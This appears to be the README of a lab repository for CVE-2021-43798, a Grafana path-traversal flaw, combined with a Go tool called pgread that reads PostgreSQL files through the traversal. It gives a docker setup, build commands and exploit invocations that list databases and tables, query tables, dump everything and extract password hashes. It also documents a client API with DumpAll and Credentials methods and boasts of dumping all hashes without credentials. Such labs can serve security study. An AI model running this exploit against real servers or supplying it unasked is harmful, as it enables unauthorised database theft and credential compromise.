# CVE-2021-43798 + pgread Lab

**Grafana Path Traversal → Dump PostgreSQL without credentials**

## Setup

```bash
docker compose up -d
```

## Exploit (Go)

```bash
cd exploit
go build -o exploit .

# Summary (credentials + table list)
./exploit http://localhost:13000 summary

# List databases
./exploit http://localhost:13000 dbs

# List tables in a database
./exploit http://localhost:13000 tables postgres

# List columns in a table
./exploit http://localhost:13000 columns postgres users

# Query a specific table
./exploit http://localhost:13000 query postgres users

# Full dump
./exploit http://localhost:13000 dump
```

## RemoteClient API

```go
// Create client with your path traversal reader
client := pgdump.NewRemoteClient(func(path string) ([]byte, error) {
    return httpGet(target + traversal + path)
})

// Explore
client.Databases()                    // List all databases
client.Tables(dbOID)                  // List tables
client.Columns(dbOID, tableOID)       // List columns
client.Query(dbOID, table, opts)      // Query with options

// Dump
client.DumpTable(dbOID, table)        // Single table
client.DumpDatabase(dbOID)            // Single database  
client.DumpAll()                      // Everything

// Quick
client.Summary()                      // Credentials + table names
client.Credentials()                  // Just password hashes
```

## Impact

| Before pgread | With pgread |
|---------------|-------------|
| Path Traversal = Medium | Path Traversal = **Critical** |
| "I can read /etc/passwd" | "I dumped all password hashes and database contents" |
